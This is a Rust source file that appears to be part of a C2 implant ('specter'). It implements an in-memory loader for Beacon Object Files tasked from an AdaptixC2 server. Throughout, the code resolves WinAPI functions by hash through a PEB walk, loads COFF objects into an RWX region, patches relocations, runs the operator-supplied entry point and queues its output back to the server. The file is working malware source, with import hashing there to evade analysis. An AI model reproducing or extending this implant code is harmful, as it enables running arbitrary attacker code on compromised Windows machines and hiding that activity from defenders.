//! BOF loader (port of `src_beacon/src/coff/runner.c` + `compat.c`) — the
//! central feature of the C2: load a COFF object in memory, resolve its
//! imports (Beacon API + `MODULE$Function` dynamic imports), apply the x64
//! relocations, and call the entry point.
//!
//! Parity decisions against the original (docs/PARITE.md):
//! - the allocation is one `VirtualAlloc` RWX region (the original splits
//!   data/code pages and flips the code pages to RX; both documented gaps),
//! - async BOFs run sequentially: the started record goes out first, then
//!   the outputs, then the finished record — no worker thread pool yet,
//! - `BeaconPrintf` formats through the bounded `bof_format` (no ntdll
//!   `_vsnprintf` reference): the `%s %d %u %x %X %c %p` set BOFs use,
//!   floats documented away,
//! - the Beacon API table ships the data/output functions the AdaptixC2
//!   `execute bof` surface needs; tokens/format/KV-store come later.
//!
//! Record plumbing (order matters to the server's task state machine):
//! small records — lifecycle (started/finished) and load errors — go
//! straight into the task-acknowledgement writer of the dispatching cycle;
//! the BOF's runtime outputs (`BeaconOutput`) land in a heap queue drained
//! at POST time over the following cycles, whole records only (a split
//! record would corrupt the server's pack parse). The finished record is
//! appended to that queue after the outputs, so the task completes last —
//! the native order. The image itself is kept on success (GUI/COM BOFs may
//! hold dangling callbacks — native parity), freed on failure.

use core::ffi::c_void;

use specter_core::coff::{self, Coff, Datum, Varargs};
use specter_core::fnv::{fnv1a64, fnv1a64_bytes_wide_ci};
use specter_core::heap::HEAP_ZERO_MEMORY;
use specter_core::peb;
use specter_core::transport::{self, BofTask};
use specter_core::wire::Writer;

use crate::runtime::bootstrap::Instance;

// ---------------------------------------------------------------------------
// WinAPI hashes (kernel32 unless noted)
// ---------------------------------------------------------------------------

const H_VIRTUAL_ALLOC: u64 = fnv1a64(b"VirtualAlloc");
const H_VIRTUAL_FREE: u64 = fnv1a64(b"VirtualFree");
const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
/// ntdll export hashes.
const H_RTL_ADD_FUNCTION_TABLE: u64 = fnv1a64(b"RtlAddFunctionTable");
const H_RTL_DELETE_FUNCTION_TABLE: u64 = fnv1a64(b"RtlDeleteFunctionTable");

const MEM_RESERVE: u32 = 0x2000;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_MASK: u32 = 0x0FFF;

/// Original MAX_MAP_FUNCS (runner.c): trampoline slots for externals.
const MAX_MAP_FUNCS: usize = 256;
/// Original MAX_SECTIONS (the core parser caps at 96).
const MAX_SECTIONS: usize = 16;
/// Vararg slots read by the BeaconPrintf shim.
const PRINTF_SLOTS: usize = 16;
/// One BeaconPrintf formatted output cap.
const PRINTF_CAP: usize = 1024;
/// The output format string read cap.
const FMT_CAP: usize = 1024;
/// The failing-symbol name cap of a SYMBOL error record.
const SYMBOL_CAP: usize = 64;

// ---------------------------------------------------------------------------
// Pending output queue (heap, instance-owned)
// ---------------------------------------------------------------------------

/// Runtime BOF outputs waiting for the next POSTs:
/// `[u32 BE recordLen][taskId BE][51 BE][type BE][array bytes]*` — whole
/// records only, so the drain never splits one.
pub struct BofPending {
    pub task_id: u32,
    pub buf: *mut u8,
    pub cap: usize,
    pub len: usize,
    pub sent: usize,
}

/// Free the pending queue's heap buffer, if any (one BOF at a time: a new
/// task replaces an unfinished queue).
///
/// # Safety
///
/// `buf` must come from the instance heap and not be freed twice.
pub unsafe fn drop_pending(instance: &mut Instance) {
    if let Some(p) = instance.bof_pending.take() {
        if !p.buf.is_null() {
            if let Some(heap) = instance.heap {
                (heap.free)(heap.handle, 0, p.buf as *mut c_void);
            }
        }
    }
}

/// Grow the queue until `need` bytes fit (alloc + manual copy + free; there
/// is no resolved HeapReAlloc by design).
unsafe fn pending_grow(heap: &specter_core::heap::Heap, p: &mut BofPending, need: usize) -> bool {
    let mut new_cap = if p.cap == 0 { 512 } else { p.cap };
    while new_cap < need {
        new_cap = new_cap.saturating_mul(2);
    }
    let nb = (heap.alloc)(heap.handle, HEAP_ZERO_MEMORY, new_cap);
    if nb.is_null() {
        return false;
    }
    let nb = nb as *mut u8;
    let mut i = 0;
    while i < p.len {
        *nb.add(i) = *p.buf.add(i);
        i += 1;
    }
    if !p.buf.is_null() {
        (heap.free)(heap.handle, 0, p.buf as *mut c_void);
    }
    p.buf = nb;
    p.cap = new_cap;
    true
}

/// Append one output record `[taskId][COMMAND_EXEC_BOF_OUT][type][array]`
/// to the pending queue, length-prefixed for the whole-record drain.
///
/// # Safety
///
/// Beacon thread (or a BOF thread holding the instance); heap resolved.
pub unsafe fn queue_output(instance: &mut Instance, output_type: u32, bytes: &[u8]) {
    let Some(heap) = instance.heap else {
        return;
    };
    let Some(p) = instance.bof_pending.as_mut() else {
        return;
    };
    let record_len = 8 + 8 + bytes.len(); // header + type/len + body
    let task_id = p.task_id;
    if p.len + 4 + record_len > p.cap && !pending_grow(&heap, p, p.len + 4 + record_len) {
        return;
    }
    let mut w = p.buf.add(p.len);
    let push4 = |w: *mut u8, v: u32| {
        let b = v.to_be_bytes();
        *w = b[0];
        *w.add(1) = b[1];
        *w.add(2) = b[2];
        *w.add(3) = b[3];
    };
    push4(w, record_len as u32);
    w = w.add(4);
    push4(w, task_id);
    w = w.add(4);
    push4(w, transport::COMMAND_EXEC_BOF_OUT);
    w = w.add(4);
    push4(w, output_type);
    w = w.add(4);
    push4(w, bytes.len() as u32);
    w = w.add(4);
    let mut i = 0;
    while i < bytes.len() {
        *w = bytes[i];
        w = w.add(1);
        i += 1;
    }
    p.len += 4 + record_len;
}

/// Drain pending records into the cycle body, whole records only, bounded by
/// the writer's capacity. The queue frees itself once fully drained.
///
/// # Safety
///
/// Beacon thread, at POST time (after `download_tick`).
pub unsafe fn bof_tick(instance: &mut Instance, w: &mut Writer) {
    let Some(p) = instance.bof_pending.as_mut() else {
        return;
    };
    while p.sent < p.len {
        if p.sent + 4 > p.len {
            break; // corrupt tail: stop draining
        }
        let b = p.buf.add(p.sent);
        let total = ((*b as u32) << 24)
            | ((*b.add(1) as u32) << 16)
            | ((*b.add(2) as u32) << 8)
            | (*b.add(3) as u32);
        let total = total as usize;
        if p.sent + 4 + total > p.len {
            break;
        }
        if w.remaining() < total {
            break; // whole record or nothing
        }
        let record = core::slice::from_raw_parts(b.add(4), total);
        let mut i = 0;
        while i < record.len() {
            if !w.push(&[record[i]]) {
                return;
            }
            i += 1;
        }
        p.sent += 4 + total;
    }
    if p.sent >= p.len {
        drop_pending(instance);
    }
}

// ---------------------------------------------------------------------------
// Beacon API (compat.c subset)
// ---------------------------------------------------------------------------

/// `BeaconOutput(type, data, len)`: queue one `COMMAND_EXEC_BOF_OUT`
/// record. The callback type rides the record's outputType field exactly as
/// the BOF passed it (0x00/0x0d/0x1e/0x20 all have server-side handlers).
///
/// Reached through the mapFuncs trampoline — no globals: the instance is
/// recovered from the TEB, the queue from the instance.
///
/// # Safety
///
/// Any thread holding the instance in its TEB (the BOF entry thread).
pub unsafe extern "C" fn beacon_output(fmt_type: i32, data: *const u8, len: i32) {
    let instance = crate::runtime::bootstrap::instance();
    if instance.is_null() {
        return; // a thread without the instance (native parity)
    }
    let instance = &mut *instance;
    if len <= 0 {
        return;
    }
    let bytes = core::slice::from_raw_parts(data, len as usize);
    queue_output(instance, fmt_type as u32, bytes);
}

/// `BeaconPrintf(type, fmt, ...)`: format with the bounded formatter, then
/// one BeaconOutput. C-variadic: the win64 integer stream is read slot by
/// slot (every integer/pointer argument is 8 bytes wide; float varargs are
/// documented away — the formatter prints their raw bit pattern).
///
/// # Safety
///
/// `fmt` must point to a NUL-terminated format string.
pub unsafe extern "C" fn beacon_printf(fmt_type: i32, fmt: *const u8, mut args: ...) {
    let mut slots = [0u64; PRINTF_SLOTS];
    let mut n = 0usize;
    while n < PRINTF_SLOTS {
        slots[n] = unsafe { args.next_arg::<u64>() };
        n += 1;
    }
    let mut flen = 0usize;
    while flen < FMT_CAP && *fmt.add(flen) != 0 {
        flen += 1;
    }
    let fmt_bytes = core::slice::from_raw_parts(fmt, flen);
    // Uninitialized on purpose: the memset rule (no compiler_builtins
    // reference); every byte read below is written by the formatter first.
    #[allow(invalid_value, clippy::uninit_assumed_init)]
    let mut out: [u8; PRINTF_CAP] = core::mem::MaybeUninit::uninit().assume_init();
    let mut written = 0usize;
    let _ = coff::bof_format(
        &mut out,
        &mut written,
        fmt_bytes,
        &Varargs {
            slots,
            count: PRINTF_SLOTS,
        },
    );
    beacon_output(fmt_type, out.as_ptr(), written as i32);
}

/// `BeaconDataParse(parser, buf, size)`: the 4-byte argument count heads the
/// blob (compat.c parity).
///
/// # Safety
///
/// `buf` must point to `size` readable bytes.
pub unsafe extern "C" fn beacon_data_parse(d: *mut Datum, buf: *mut u8, size: i32) {
    coff::datum_parse(&mut *d, buf, size);
}

/// # Safety
///
/// `d` must point to a parser initialized by `beacon_data_parse`.
pub unsafe extern "C" fn beacon_data_int(d: *mut Datum) -> i32 {
    coff::datum_int(&mut *d).unwrap_or(0)
}

/// # Safety
///
/// `d` must point to a parser initialized by `beacon_data_parse`.
pub unsafe extern "C" fn beacon_data_short(d: *mut Datum) -> i16 {
    coff::datum_short(&mut *d).unwrap_or(0)
}

/// # Safety
///
/// `d` must point to a parser initialized by `beacon_data_parse`.
pub unsafe extern "C" fn beacon_data_length(d: *mut Datum) -> i32 {
    (*d).length
}

/// `BeaconDataExtract(parser, &len)`: a length-prefixed run, NULL on a
/// malformed length (compat.c parity).
///
/// # Safety
///
/// `d` must point to a parser initialized by `beacon_data_parse`.
pub unsafe extern "C" fn beacon_data_extract(d: *mut Datum, out_len: *mut i32) -> *mut u8 {
    match coff::datum_bytes(&mut *d) {
        Some((p, len)) => {
            *out_len = len;
            p as *mut u8
        }
        None => {
            *out_len = 0;
            core::ptr::null_mut()
        }
    }
}

/// `BeaconDataPtr(parser, size)`: the next `size` bytes without a length
/// prefix (compat.c parity).
///
/// # Safety
///
/// `d` must point to a parser initialized by `beacon_data_parse`.
pub unsafe extern "C" fn beacon_data_ptr(d: *mut Datum, size: i32) -> *mut u8 {
    if size <= 0 || size > (*d).length {
        return core::ptr::null_mut();
    }
    let p = (*d).buffer;
    (*d).buffer = p.add(size as usize);
    (*d).length -= size;
    p
}

/// The Beacon API dispatch table, by FNV-64 hash of the name (compat.c
/// `SptBofBuildApiTable`, subset). The names hash exactly like the original
/// (`SptHashStr` of the bare name).
fn beacon_api(name: &[u8]) -> Option<usize> {
    match fnv1a64(name) {
        h if h == fnv1a64(b"BeaconOutput") => Some(beacon_output as *const () as usize),
        h if h == fnv1a64(b"BeaconPrintf") => Some(beacon_printf as *const () as usize),
        h if h == fnv1a64(b"BeaconDataParse") => Some(beacon_data_parse as *const () as usize),
        h if h == fnv1a64(b"BeaconDataInt") => Some(beacon_data_int as *const () as usize),
        h if h == fnv1a64(b"BeaconDataShort") => Some(beacon_data_short as *const () as usize),
        h if h == fnv1a64(b"BeaconDataLength") => Some(beacon_data_length as *const () as usize),
        h if h == fnv1a64(b"BeaconDataExtract") => Some(beacon_data_extract as *const () as usize),
        h if h == fnv1a64(b"BeaconDataPtr") => Some(beacon_data_ptr as *const () as usize),
        _ => None,
    }
}

/// Resolve one external symbol (runner.c `ResolveExternal`): strip `__imp_`,
/// then `MODULE$Function` loads the module (PEB first, LoadLibraryA
/// fallback) and resolves by hash; a bare name (or `BEACON$...`) is a
/// Beacon API. Anything else fails with BOF_ERROR_SYMBOL.
///
/// # Safety
///
/// Beacon thread; the PEB walk and LoadLibraryA touch the loader.
unsafe fn resolve_external(instance: &Instance, name: &[u8]) -> Option<usize> {
    let sym = if name.len() >= 6 && bytes_eq(&name[..6], b"__imp_") {
        &name[6..]
    } else {
        name
    };
    let mut dollar = sym.len();
    let mut i = 0;
    while i < sym.len() {
        if sym[i] == b'$' {
            dollar = i;
            break;
        }
        i += 1;
    }
    if dollar == sym.len() {
        return beacon_api(sym);
    }
    let module = &sym[..dollar];
    let func = &sym[dollar + 1..];
    if bytes_eq(module, b"BEACON") {
        return beacon_api(func);
    }
    // MODULE$Function: a dynamic import. The module name gains ".dll" when
    // it does not already end with one (runner.c parity).
    if module.len() > 64 {
        return None;
    }
    let mut dll = [0u8; 72];
    let mut mlen = module.len();
    let mut j = 0;
    while j < mlen {
        dll[j] = module[j];
        j += 1;
    }
    if mlen < 4 || dll[mlen - 4] != b'.' {
        if mlen + 5 > dll.len() {
            return None;
        }
        dll[mlen] = b'.';
        dll[mlen + 1] = b'd';
        dll[mlen + 2] = b'l';
        dll[mlen + 3] = b'l';
        dll[mlen + 4] = 0;
        mlen += 4;
    } else {
        dll[mlen] = 0;
        mlen += 1;
    }
    let mut handle = peb::find_module(
        crate::runtime::bootstrap::get_peb(),
        fnv1a64_bytes_wide_ci(&dll[..mlen]),
    );
    if handle.is_null() {
        let load = peb::find_export(instance.kernel32, H_LOAD_LIBRARY_A);
        if load.is_null() {
            return None;
        }
        let load = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*const u8) -> *mut c_void,
        >(load as *const core::ffi::c_void);
        handle = load(dll.as_ptr());
        if handle.is_null() {
            return None;
        }
    }
    let p = peb::find_export(handle, fnv1a64(func));
    if p.is_null() {
        None
    } else {
        Some(p as usize)
    }
}

// ---------------------------------------------------------------------------
// Loader (runner.c SptBofLoad)
// ---------------------------------------------------------------------------

/// Byte-slice equality, manual (the memcmp rule: `==` on byte slices lowers
/// to a memcmp reference, and one reference pulls the whole
/// compiler_builtins object into the blob).
fn bytes_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut i = 0;
    while i < a.len() {
        if a[i] != b[i] {
            return false;
        }
        i += 1;
    }
    true
}

/// Load error, mapped to the native `BOF_ERROR_*` output types.
struct LoadError {
    output_type: u32,
    /// The failing symbol name (BOF_ERROR_SYMBOL), empty elsewhere.
    symbol: [u8; SYMBOL_CAP],
    symbol_len: u8,
}

impl LoadError {
    fn simple(output_type: u32) -> Self {
        LoadError {
            output_type,
            symbol: [0; SYMBOL_CAP],
            symbol_len: 0,
        }
    }

    fn symbol_name(name: &[u8]) -> Self {
        let mut e = LoadError::simple(transport::BOF_ERROR_SYMBOL);
        let n = name.len().min(SYMBOL_CAP);
        let mut i = 0;
        while i < n {
            e.symbol[i] = name[i];
            i += 1;
        }
        e.symbol_len = n as u8;
        e
    }

    fn message(&self) -> &[u8] {
        &self.symbol[..self.symbol_len as usize]
    }
}

/// Execute one `execute bof` task: load, run, queue the records. The task's
/// slices borrow the response buffer — inline execution only (like
/// SAVEMEMORY). Small records go into `results` (the dispatch writer);
/// runtime outputs go into the pending heap queue, finished last.
///
/// # Safety
///
/// Beacon thread; instance stored in the TEB.
pub unsafe fn exec(instance: &mut Instance, task: &BofTask, results: &mut Writer) {
    crate::runtime::debug::log(instance, b"bof: exec\n");
    drop_pending(instance);
    if instance.heap.is_none() {
        // No heap: the output queue cannot exist — the allocation error.
        let _ = transport::push_bof_output(results, task.task_id, transport::BOF_ERROR_ALLOC, b"");
        let _ = transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_FINISHED);
        return;
    }
    // Async: the started record goes out with this cycle's acknowledgements
    // (Completed=false server-side); the run is sequential behind it.
    if task.async_flag {
        let _ = transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_STARTED);
    }
    instance.bof_pending = Some(BofPending {
        task_id: task.task_id,
        buf: core::ptr::null_mut(),
        cap: 0,
        len: 0,
        sent: 0,
    });
    match load_and_run(instance, task) {
        Ok(()) => {
            // Finished AFTER the outputs the BOF produced (native order):
            // it rides the pending queue.
            queue_lifecycle(instance, task.task_id, transport::BOF_STATE_FINISHED);
            crate::runtime::debug::log(instance, b"bof: done\n");
        }
        Err(e) => {
            drop_pending(instance);
            let _ = transport::push_bof_output(results, task.task_id, e.output_type, e.message());
            let _ =
                transport::push_bof_lifecycle(results, task.task_id, transport::BOF_STATE_FINISHED);
            crate::runtime::debug::log(instance, b"bof: error\n");
        }
    }
}

/// Queue the finished lifecycle record into the pending heap queue (after
/// the outputs — the drain preserves the order).
unsafe fn queue_lifecycle(instance: &mut Instance, task_id: u32, state: u8) {
    let Some(heap) = instance.heap else {
        return;
    };
    let Some(p) = instance.bof_pending.as_mut() else {
        return;
    };
    let record_len = 9; // taskId || command || state
    if p.len + 4 + record_len > p.cap && !pending_grow(&heap, p, p.len + 4 + record_len) {
        return;
    }
    let mut w = p.buf.add(p.len);
    let push4 = |w: *mut u8, v: u32| {
        let b = v.to_be_bytes();
        *w = b[0];
        *w.add(1) = b[1];
        *w.add(2) = b[2];
        *w.add(3) = b[3];
    };
    push4(w, record_len as u32);
    w = w.add(4);
    push4(w, task_id);
    w = w.add(4);
    push4(w, transport::COMMAND_EXEC_BOF);
    w = w.add(4);
    *w = state;
    p.len += 4 + record_len;
}

/// The full load (runner.c): layout, alloc, copy, resolve, relocate, entry.
/// The image is freed on error (success leaks it — GUI/COM BOFs may hold
/// dangling callbacks, native parity).
unsafe fn load_and_run(instance: &mut Instance, task: &BofTask) -> Result<(), LoadError> {
    let coff = match Coff::parse(task.bof) {
        Some(c) => c,
        None => return Err(LoadError::simple(transport::BOF_ERROR_PARSE)),
    };
    let nsec = coff.num_sections();
    if nsec > MAX_SECTIONS {
        return Err(LoadError::simple(transport::BOF_ERROR_PARSE));
    }

    // Layout (runner.c): data sections first, then the mapFuncs trampoline,
    // then code sections page-aligned. Raw size first, virtual size for
    // BSS; 16-byte granularity; one region keeps REL32 in range.
    let mut sec_size = [0u32; MAX_SECTIONS];
    let mut sec_off = [0u32; MAX_SECTIONS];
    let mut i = 0;
    while i < nsec {
        let s = coff
            .section(i)
            .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_PARSE))?;
        sec_size[i] = if s.raw_size > 0 {
            s.raw_size
        } else {
            s.virtual_size
        };
        i += 1;
    }
    let mut data_end: u32 = 0;
    i = 0;
    while i < nsec {
        let s = coff.section(i);
        if let Some(s) = s {
            if sec_size[i] > 0 && !s.executable() {
                sec_off[i] = data_end;
                data_end = data_end.wrapping_add((sec_size[i] + 15) & !15);
            }
        }
        i += 1;
    }
    let map_off = data_end;
    data_end = data_end.wrapping_add((MAX_MAP_FUNCS * 8) as u32);
    let code_start = (data_end + PAGE_MASK) & !PAGE_MASK;
    let mut code_end = code_start;
    i = 0;
    while i < nsec {
        let s = coff.section(i);
        if let Some(s) = s {
            if sec_size[i] > 0 && s.executable() {
                sec_off[i] = code_end;
                code_end = code_end.wrapping_add((sec_size[i] + 15) & !15);
            }
        }
        i += 1;
    }
    let total = code_end as usize;
    if total == 0 {
        return Err(LoadError::simple(transport::BOF_ERROR_PARSE));
    }

    let va = peb::find_export(instance.kernel32, H_VIRTUAL_ALLOC);
    if va.is_null() {
        return Err(LoadError::simple(transport::BOF_ERROR_ALLOC));
    }
    let va = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void,
    >(va as *const core::ffi::c_void);
    let base = va(
        core::ptr::null_mut(),
        total,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    ) as *mut u8;
    if base.is_null() {
        return Err(LoadError::simple(transport::BOF_ERROR_ALLOC));
    }

    let result = load_into(instance, &coff, task, base, &sec_size, &sec_off, map_off);
    if result.is_err() {
        let vf = peb::find_export(instance.kernel32, H_VIRTUAL_FREE);
        if !vf.is_null() {
            let vf = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut c_void, usize, u32) -> i32,
            >(vf as *const core::ffi::c_void);
            vf(base as *mut c_void, 0, MEM_RELEASE);
        }
    }
    result
}

/// Copy sections, resolve externals into mapFuncs, apply relocations, call
/// the entry. Split from `load_and_run` for the alloc/cleanup symmetry.
unsafe fn load_into(
    instance: &mut Instance,
    coff: &Coff,
    task: &BofTask,
    base: *mut u8,
    sec_size: &[u32; MAX_SECTIONS],
    sec_off: &[u32; MAX_SECTIONS],
    map_off: u32,
) -> Result<(), LoadError> {
    let nsec = coff.num_sections();
    // Section copies (manual: the memcpy rule).
    let mut i = 0;
    while i < nsec {
        let s = coff
            .section(i)
            .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_PARSE))?;
        if s.raw_size > 0 {
            let raw = s.raw(task.bof);
            if raw.len() != s.raw_size as usize {
                return Err(LoadError::simple(transport::BOF_ERROR_PARSE));
            }
            let dst = base.add(sec_off[i] as usize);
            let mut j = 0;
            while j < raw.len() {
                *dst.add(j) = raw[j];
                j += 1;
            }
        }
        i += 1;
    }

    // mapFuncs trampoline slots.
    let map_funcs = base.add(map_off as usize) as *mut usize;

    // Pass 1: resolve external symbols (runner.c first pass).
    let mut map_count = 0usize;
    let mut idx = 0usize;
    while idx < coff.num_symbols() {
        let sym = coff
            .symbol(idx)
            .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_PARSE))?;
        let step = 1 + sym.aux as usize;
        if sym.is_import() {
            if map_count >= MAX_MAP_FUNCS {
                return Err(LoadError::simple(transport::BOF_ERROR_MAX_FUNCS));
            }
            let name = coff.symbol_name(idx);
            match resolve_external(instance, name) {
                Some(ptr) => {
                    *map_funcs.add(map_count) = ptr;
                    map_count += 1;
                }
                None => return Err(LoadError::symbol_name(name)),
            }
        }
        idx += step;
    }

    // Pass 2: relocations (runner.c second pass, additive patches).
    i = 0;
    while i < nsec {
        let s = coff
            .section(i)
            .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_PARSE))?;
        let sec_base = base.add(sec_off[i] as usize);
        let mut r = 0usize;
        while r < s.num_relocs as usize {
            let (site, typ, sym_idx) = match coff.reloc(&s, r) {
                Some(x) => x,
                None => return Err(LoadError::simple(transport::BOF_ERROR_PARSE)),
            };
            if site as usize >= sec_size[i] as usize {
                return Err(LoadError::simple(transport::BOF_ERROR_PARSE));
            }
            let sym = coff
                .symbol(sym_idx as usize)
                .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_PARSE))?;
            let patch = sec_base.add(site as usize);
            let sym_addr: usize = if sym.is_import() {
                // The external's mapFuncs slot (call qword ptr [rip+disp32]).
                let mut ext_idx = 0usize;
                let mut si = 0usize;
                while si < sym_idx as usize {
                    let s2 = coff
                        .symbol(si)
                        .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_PARSE))?;
                    let step2 = 1 + s2.aux as usize;
                    if s2.is_import() {
                        ext_idx += 1;
                    }
                    si += step2;
                }
                if ext_idx >= map_count {
                    return Err(LoadError::simple(transport::BOF_ERROR_PARSE));
                }
                map_funcs.add(ext_idx) as usize
            } else if sym.secnum > 0 {
                let sn = sym.secnum as usize - 1;
                if sn >= nsec || sec_size[sn] == 0 {
                    continue; // the native array walk would run off; we skip
                }
                base.add(sec_off[sn] as usize + sym.value as usize) as usize
            } else {
                continue;
            };
            match typ {
                coff::REL_ADDR64 => {
                    let p = patch as *mut u64;
                    *p = p.read_unaligned().wrapping_add(sym_addr as u64);
                }
                coff::REL_ADDR32NB => {
                    let p = patch as *mut u32;
                    *p = p
                        .read_unaligned()
                        .wrapping_add((sym_addr.wrapping_sub(base as usize)) as u32);
                }
                coff::REL_REL32..=coff::REL_REL32_5 => {
                    // REL32: S - P - 4; REL32_k: S - P - (4 + k).
                    let k = 4 + (typ - coff::REL_REL32) as usize;
                    let p = patch as *mut i32;
                    *p = p
                        .read_unaligned()
                        .wrapping_add((sym_addr as i64 - patch as i64 - k as i64) as i32);
                }
                _ => {} // ADDR32: no native case either
            }
            r += 1;
        }
        i += 1;
    }

    // Entry point: the task names it (the server always sends "go").
    let (entry_sec, value) = find_defined(coff, task.entry_name())
        .ok_or_else(|| LoadError::simple(transport::BOF_ERROR_ENTRY))?;
    let entry = base.add(sec_off[entry_sec] as usize + value as usize);

    // .pdata registration for SEH BOFs (runner.c): RUNTIME_FUNCTION entries
    // whose RVAs the ADDR32NB relocations fixed against our base.
    let mut pdata_base: *mut c_void = core::ptr::null_mut();
    let mut pdata_count: u32 = 0;
    i = 0;
    while i < nsec {
        if let Some(s) = coff.section(i) {
            if sec_size[i] > 0 && s.name.len() >= 7 && bytes_eq(&s.name[..7], b".pdata\0") {
                pdata_base = base.add(sec_off[i] as usize) as *mut c_void;
                pdata_count = sec_size[i] / 12;
                break;
            }
        }
        i += 1;
    }
    let mut func_table = false;
    if !pdata_base.is_null() && pdata_count > 0 {
        let add = peb::find_export(instance.ntdll, H_RTL_ADD_FUNCTION_TABLE);
        if !add.is_null() {
            let add = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut c_void, u32, u64) -> i32,
            >(add as *const core::ffi::c_void);
            add(pdata_base, pdata_count, base as u64);
            func_table = true;
        }
    }

    // Execute: go(args, argslen) — a direct call, like the original.
    let go: unsafe extern "C" fn(*const u8, u32) = core::mem::transmute(entry);
    go(task.args.as_ptr(), task.args.len() as u32);

    if func_table {
        let del = peb::find_export(instance.ntdll, H_RTL_DELETE_FUNCTION_TABLE);
        if !del.is_null() {
            let del = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*mut c_void) -> i32,
            >(del as *const core::ffi::c_void);
            del(pdata_base);
        }
    }
    Ok(())
}

/// The raw symbol index, section index and value of a defined external
/// symbol by name (the entry-point lookup; walks over aux records).
fn find_defined(coff: &Coff, name: &[u8]) -> Option<(usize, u32)> {
    let mut i = 0usize;
    while i < coff.num_symbols() {
        let sym = coff.symbol(i)?;
        let step = 1 + sym.aux as usize;
        if sym.is_external() && sym.secnum > 0 && bytes_eq(coff.symbol_name(i), name) {
            let sn = sym.secnum as usize;
            if sn == 0 {
                return None;
            }
            return Some((sn - 1, sym.value));
        }
        i += step;
    }
    None
}
